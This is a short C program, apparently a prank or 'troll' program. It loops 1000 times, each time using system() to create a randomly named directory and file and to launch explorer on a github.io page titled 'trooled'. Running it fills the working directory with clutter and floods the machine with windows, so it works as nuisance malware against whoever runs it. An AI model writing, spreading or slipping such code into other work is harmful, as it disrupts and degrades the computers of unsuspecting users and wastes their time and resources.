#include <stdio.h>
#include <stdlib.h>
#include <time.h>


int main(void)
{
	srand(time(NULL));
	char buf[BUFSIZ];
	char buf2[BUFSIZ];
	

	for(int i=0; i<1000; i++){
		int r = rand();
		snprintf(buf, sizeof(buf), "mkdir %d", r);
		system(buf);
		snprintf(buf2, sizeof(buf2), "touch %d", r);
		system(buf2);
		char open[] = "explorer https://slav-xpxz.github.io/trooled/";
		system(open);

	}

	return 0;
}
